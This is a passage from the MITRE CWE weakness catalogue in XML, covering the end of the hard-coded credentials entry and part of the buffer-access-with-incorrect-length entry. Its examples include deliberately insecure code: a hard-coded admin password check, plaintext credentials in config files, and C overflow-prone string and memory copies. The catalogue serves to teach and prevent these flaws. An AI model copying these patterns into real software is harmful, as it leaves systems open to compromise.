                     <Code>public boolean VerifyAdmin(String password) {</Code>
                     <Block>
                        <Code>if (password.equals("68af404b513073584c4b6f22b6c63e6b"))
									{</Code>
                        <Block>
                           <Code>System.out.println("Entering Diagnostic Mode...");</Code>
                           <Code>return true;</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>System.out.println("Incorrect Password!");</Code>
                        <Code>return false;</Code>
                     </Block>
                  </Block>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C#</Code_Example_Language>
                     <Code>int VerifyAdmin(String password) {</Code>
                     <Block>
                        <Code>if (password.Equals("68af404b513073584c4b6f22b6c63e6b"))
									{</Code>
                        <Block>
                           <Code>Console.WriteLine("Entering Diagnostic Mode...");</Code>
                           <Code>return(1);</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>Console.WriteLine("Incorrect Password!");</Code>
                        <Code>return(0);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>The cryptographic key is within a hard-coded string value that is
							compared to the password. It is likely that an attacker will be able to
							read the key and compromise the system.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and
						configuration files for Java and ASP.NET applications. The files include
						username and password information but they are stored in
						plaintext.</Intro_Text>
               <Example_Body>
                  <Text>This Java example shows a properties file with a plaintext username /
							password pair.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Comment># Java Web App ResourceBundle properties file</Comment>
                     <Code>...</Code>
                     <Code>webapp.ldap.username=secretUsername</Code>
                     <Code>webapp.ldap.password=secretPassword</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>The following example shows a portion of a configuration file for an
							ASP.Net application. This configuration file includes username and
							password information for a connection to a database but the pair is
							stored in plaintext.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>ASP.NET</Code_Example_Language>
                     <Code>...</Code>
                     <Code>&lt;connectionStrings&gt;</Code>
                     <Code>&lt;add name="ud_DEV" connectionString="connectDB=uDB;
								uid=db2admin; pwd=password; dbalias=uDB;"
								providerName="System.Data.Odbc" /&gt;</Code>
                     <Code>&lt;/connectionStrings&gt;</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>Username and password information should not be included in a
							configuration file or a properties file in plaintext as this will allow
							anyone who can read the file access to the resource. If possible,
							encrypt this information and avoid CWE-260 and CWE-13.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-2772</Observed_Example_Reference>
               <Observed_Example_Description>SCADA system uses a hard-coded password to protect
						back-end database containing authorization information, exploited by Stuxnet
						worm</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-2073</Observed_Example_Reference>
               <Observed_Example_Description>FTP server library uses hard-coded usernames and
						passwords for three default accounts</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-1573</Observed_Example_Reference>
               <Observed_Example_Description>Chain: Router firmware uses hard-coded username
						and password for access to debug functionality, which can be used to execute
						arbitrary code</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2369</Observed_Example_Reference>
               <Observed_Example_Description>Server uses hard-coded authentication
						key</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0961</Observed_Example_Reference>
               <Observed_Example_Description>Backup product uses hard-coded username and
						password, allowing attackers to bypass authentication via the RPC
						interface</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-1160</Observed_Example_Reference>
               <Observed_Example_Description>Security appliance uses hard-coded password
						allowing attackers to gain root access</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-7142</Observed_Example_Reference>
               <Observed_Example_Description>Drive encryption product stores hard-coded
						cryptographic keys for encrypted configuration files in executable
						programs</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-3716</Observed_Example_Reference>
               <Observed_Example_Description>VoIP product uses unchangeable hard-coded public
						credentials that cannot be changed, which allows attackers to obtain
						sensitive information</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-3803</Observed_Example_Reference>
               <Observed_Example_Description>VoIP product uses hard coded public and private
						SNMP community strings that cannot be changed, which allows remote attackers
						to obtain sensitive information </Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-0496</Observed_Example_Reference>
               <Observed_Example_Description>Backup product contains hard-coded credentials
						that effectively serve as a back door, which allows remote attackers to
						access the file system</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.798.1">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 8, "Key Management Issues" Page
						272</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.798.2">
               <Reference_Author>Johannes Ullrich</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 11 - Hardcoded
						Credentials</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-10</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/03/10/top-25-series-rank-11-hardcoded-credentials/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-33">
               <Reference_Author>Chris Wysopal</Reference_Author>
               <Reference_Title>Mobile App Top 10 List</Reference_Title>
               <Reference_Date>2010-12-13</Reference_Date>
               <Reference_Link>http://www.veracode.com/blog/2010/12/mobile-app-top-10-list/</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Never hard code sensitive information</Mapped_Node_Name>
               <Mapped_Node_ID>MSC03-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>190</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>191</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>70</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submitter_Organization>MITRE</Submitter_Organization>
               <Submission_Date>2010-01-15</Submission_Date>
               <Submission_Comment>More abstract entry for hard-coded password and hard-coded
						cryptographic key.</Submission_Comment>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns,
						Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Detection_Factors</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="805" Name="Buffer Access with Incorrect Length Value" Weakness_Abstraction="Base" Status="Incomplete">
         <Description>
            <Description_Summary>The software uses a sequential operation to read or write a
					buffer, but it uses an incorrect length value that causes it to access memory
					that is outside of the bounds of the buffer. </Description_Summary>
            <Extended_Description>
               <Text>When the length value exceeds the size of the destination, a buffer
						overflow could occur.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>802</Relationship_Target_ID>
               <!--2010 Top 25 - Risky Resource Management--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>119</Relationship_Target_ID>
               <!--Improper Restriction of Operations within the Bounds of a Memory Buffer--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>874</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 06 - Arrays and the STL (ARR)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>740</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 06 - Arrays (ARR)--></Relationship>
         </Relationships>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Languages>
               <Language Language_Name="C" Prevalence="Often"/>
               <Language Language_Name="C++" Prevalence="Often"/>
               <Language Language_Name="Assembly"/>
            </Languages>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium to High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>Execute unauthorized code or
						commands</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Buffer overflows often can be used to execute arbitrary code, which is
							usually outside the scope of a program's implicit security policy. This
							can often be used to subvert any other security service.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Availability</Consequence_Scope>
               <Consequence_Technical_Impact>DoS: crash / exit /
						restart</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>DoS: resource consumption
						(CPU)</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Buffer overflows generally lead to crashes. Other attacks leading to
							lack of availability are possible, including putting the program into an
							infinite loop.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can often be detected using automated static analysis
							tools. Many modern tools use data flow analysis or constraint-based
							techniques to minimize the number of false positives.</Text>
                  <Text>Automated static analysis generally does not account for environmental
							considerations when reporting out-of-bounds memory operations. This can
							make it difficult for users to determine which warnings should be
							investigated first. For example, an analysis tool might report buffer
							overflows that originate from command line arguments in a program that
							is not expected to run with setuid or other special privileges.</Text>
               </Method_Description>
               <Method_Effectiveness>High</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text>Detection techniques for buffer-related errors are more mature than
							for most other weakness types.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using dynamic tools and techniques that
							interact with the software using large test suites with many diverse
							inputs, such as fuzz testing (fuzzing), robustness testing, and fault
							injection. The software's operation may slow down, but it should not
							become unstable, crash, or generate incorrect results.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text>Without visibility into the code, black box methods may not be able to
							sufficiently distinguish this weakness from others, requiring manual
							methods to diagnose the underlying problem. </Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-9">
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>Manual analysis can be useful for finding this weakness, but it might
							not achieve desired code coverage within limited time constraints. This
							becomes difficult for weaknesses that must be considered for all inputs,
							since the attack surface can be too large.</Text>
               </Method_Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-3">
               <Mitigation_Phase>Requirements</Mitigation_Phase>
               <Mitigation_Strategy>Language Selection</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a language that does not allow this weakness to occur or provides
							constructs that make this weakness easier to avoid.</Text>
                  <Text>For example, many languages that perform their own memory management,
							such as Java and Perl, are not subject to buffer overflows. Other
							languages, such as Ada and C#, typically provide overflow protection,
							but the protection can be disabled by the programmer.</Text>
                  <Text>Be wary that a language's interface to native code may still be
							subject to overflows, even if the language itself is theoretically safe.
						</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.1">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>Examples include the Safe C String Library (SafeStr) by Messier and
							Viega [R.805.6], and the Strsafe.h library from Microsoft [R.805.7].
							These libraries provide safer versions of overflow-prone string-handling
							functions.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not a complete solution, since many buffer overflows are not
							related to strings.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-10">
               <Mitigation_Phase>Build and Compilation</Mitigation_Phase>
               <Mitigation_Strategy>Compilation or Build Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run or compile the software using features or extensions that
							automatically provide a protection mechanism that mitigates or
							eliminates buffer overflows.</Text>
                  <Text>For example, certain compilers and extensions provide automatic buffer
							overflow detection mechanisms that are built into the compiled code.
							Examples include the Microsoft Visual Studio /GS flag, Fedora/Red Hat
							FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not necessarily a complete solution, since these mechanisms
							can only detect certain types of overflows. In addition, an attack could
							still cause a denial of service, since the typical response is to exit
							the application.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-9">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Consider adhering to the following rules when allocating and managing
							an application's memory:</Text>
                  <Block Block_Nature="List">
                     <Text>Double check that your buffer is as large as you specify.</Text>
                     <Text>When using functions that accept a number of bytes to copy, such
								as strncpy(), be aware that if the destination buffer size is equal
								to the source buffer size, it may not NULL-terminate the
								string.</Text>
                     <Text>Check buffer boundaries if accessing the buffer in a loop and make
								sure you are not in danger of writing past the allocated
								space.</Text>
                     <Text>If necessary, truncate all input strings to a reasonable length
								before passing them to the copy and concatenation functions.</Text>
                  </Block>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-11">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run or compile the software using features or extensions that randomly
							arrange the positions of a program's executable and libraries in memory.
							Because this makes the addresses unpredictable, it can prevent an
							attacker from reliably jumping to exploitable code.</Text>
                  <Text>Examples include Address Space Layout Randomization (ASLR) [R.805.2]
							[R.805.4] and Position-Independent Executables (PIE) [R.805.10].</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not a complete solution. However, it forces the attacker to
							guess an unknown value that changes every program execution. In
							addition, an attack could still cause a denial of service, since the
							typical response is to exit the application.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-12">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a CPU and operating system that offers Data Execution Protection
							(NX) or its equivalent [R.805.3] [R.805.6].</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This is not a complete solution, since buffer overflows could be used
							to overwrite nearby variables to modify the software's state in
							dangerous ways. In addition, it cannot be used in cases in which
							self-modifying code is required. Finally, an attack could still cause a
							denial of service, since the typical response is to exit the
							application.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run your code using the lowest privileges that are required to
							accomplish the necessary tasks [R.805.9]. If possible, create isolated
							accounts with limited privileges that are only used for a single task.
							That way, a successful attack will not immediately give the attacker
							access to the rest of the software or its environment. For example,
							database applications rarely need to run as the database administrator,
							especially in day-to-day operations.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Sandbox or Jail</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run the code in a "jail" or similar sandbox environment that enforces
							strict boundaries between the process and the operating system. This may
							effectively restrict which files can be accessed in a particular
							directory or which commands can be executed by the software.</Text>
                  <Text>OS-level examples include the Unix chroot jail, AppArmor, and SELinux.
							In general, managed code may provide some protection. For example,
							java.io.FilePermission in the Java SecurityManager allows the software
							to specify restrictions on file operations.</Text>
                  <Text>This may not be a feasible solution, and it only limits the impact to
							the operating system; the rest of the application may still be subject
							to compromise.</Text>
                  <Text>Be careful to avoid CWE-243 and other weaknesses related to jails.
						</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Limited</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>The effectiveness of this mitigation depends on the prevention
							capabilities of the specific sandbox or jail being used and might only
							help to reduce the scope of an attack, such as restricting the attacker
							to certain system calls or limiting the portion of the file system that
							can be accessed. </Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Causal_Nature>Explicit</Causal_Nature>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-1">
               <Intro_Text>This example takes an IP address from a user, verifies that it is
						well formed and then looks up the hostname and copies it into a
						buffer.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>void host_lookup(char *user_supplied_addr){</Code>
                     <Block>
                        <Code>struct hostent *hp;</Code>
                        <Code>in_addr_t *addr;</Code>
                        <Code>char hostname[64];</Code>
                        <Code>in_addr_t inet_addr(const char *cp);</Code>
                        <Code/>
                        <Comment>/*routine that ensures user_supplied_addr is in the right
									format for conversion */</Comment>
                        <Code>validate_addr_form(user_supplied_addr);</Code>
                        <Code>addr = inet_addr(user_supplied_addr);</Code>
                        <Code>hp = gethostbyaddr( addr, sizeof(struct in_addr),
									AF_INET);</Code>
                        <Code>strcpy(hostname, hp-&gt;h_name);</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>This function allocates a buffer of 64 bytes to store the hostname
							under the assumption that the maximum length value of hostname is 64
							bytes, however there is no guarantee that the hostname will not be
							larger than 64 bytes. If an attacker specifies an address which resolves
							to a very large hostname, then we may overwrite sensitive data or even
							relinquish control flow to the attacker.</Text>
                  <Text>Note that this example also contains an unchecked return value
							(CWE-252) that can lead to a NULL pointer dereference (CWE-476).</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-114">
               <Intro_Text>In the following example, it is possible to request that memcpy move
						a much larger segment of memory than assumed:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>int returnChunkSize(void *) {</Code>
                     <Block>
                        <Comment>/* if chunk info is valid, return the size of usable
									memory,</Comment>
                        <Comment>* else, return -1 to indicate an error</Comment>
                        <Comment>*/</Comment>
                        <Code>...</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>int main() {</Code>
                     <Block>
                        <Code>...</Code>
                        <Code>memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));</Code>
                        <Code>...</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>If returnChunkSize() happens to encounter an error it will return -1.
							Notice that the return value is not checked before the memcpy operation
							(CWE-252), so -1 can be passed as the size argument to memcpy()
							(CWE-805). Because memcpy() assumes that the value is unsigned, it will
							be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more
							memory than is likely available to the destination buffer (CWE-787,
							CWE-788). </Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the following example, the source character string is copied to
						the dest character string using the method strncpy.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>...</Code>
                     <Code>char source[21] = "the character string";</Code>
                     <Code>char dest[12];</Code>
                     <Code>strncpy(dest, source, sizeof(source)-1);</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>However, in the call to strncpy the source character string is used
							within the sizeof call to determine the number of characters to copy.
							This will create a buffer overflow as the size of the source character
							string is greater than the dest character string. The dest character
							string should be used within the sizeof call to ensure that the correct
							number of characters are copied, as shown below.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>...</Code>
                     <Code>char source[21] = "the character string";</Code>
                     <Code>char dest[12];</Code>
                     <Code>strncpy(dest, source, sizeof(dest)-1);</Code>
                     <Code>...</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In this example, the method outputFilenameToLog outputs a filename
						to a log file. The method arguments include a pointer to a character string
						containing the file name and an integer for the number of characters in the
						string. The filename is copied to a buffer where the buffer size is set to a
						maximum size for inputs to the log file. The method then calls another
						method to save the contents of the buffer to the log file.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>#define LOG_INPUT_SIZE 40</Code>
                     <Code/>
                     <Comment>// saves the file name to a log file</Comment>
                     <Code>int outputFilenameToLog(char *filename, int length) {</Code>
                     <Block>
                        <Code>int success;</Code>
                        <Code/>
                        <Comment>// buffer with size set to maximum size for input to log
									file</Comment>
                        <Code>char buf[LOG_INPUT_SIZE];</Code>
                        <Code/>
                        <Comment>// copy filename to buffer</Comment>
                        <Code>strncpy(buf, filename, length);</Code>
                        <Code/>
                        <Comment>// save to log file</Comment>
                        <Code>success = saveToLogFile(buf);</Code>
                        <Code/>
                        <Code>return success;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>However, in this case the string copy method, strncpy, mistakenly uses
							the length method argument to determine the number of characters to copy
							rather than using the size of the local character string, buf. This can
							lead to a buffer overflow if the number of characters contained in
							character string pointed to by filename is larger then the number of
							characters allowed for the local character string. The string copy
							method should use the buf character string within a sizeof call to
							ensure that only characters up to the size of the buf array are copied
							to avoid a buffer overflow, as shown below.</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>...</Code>
                     <Comment>// copy filename to buffer</Comment>
                     <Code>strncpy(buf, filename, sizeof(buf)-1);</Code>
                     <Code>...</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2011-1959</Observed_Example_Reference>
               <Observed_Example_Description>Chain: large length value causes buffer over-read
						(CWE-126)</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2011-1848</Observed_Example_Reference>
               <Observed_Example_Description>Use of packet length field to make a calculation,
						then copy into a fixed-size buffer</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2011-0105</Observed_Example_Reference>
               <Observed_Example_Description>Chain: retrieval of length value from an
						uninitialized memory location</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2011-0606</Observed_Example_Reference>
               <Observed_Example_Description>Crafted length value in document reader leads to
						buffer overflow</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2011-0651</Observed_Example_Reference>
               <Observed_Example_Description>SSL server overflow when the sum of multiple
						length fields exceeds a given value</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2010-4156</Observed_Example_Reference>
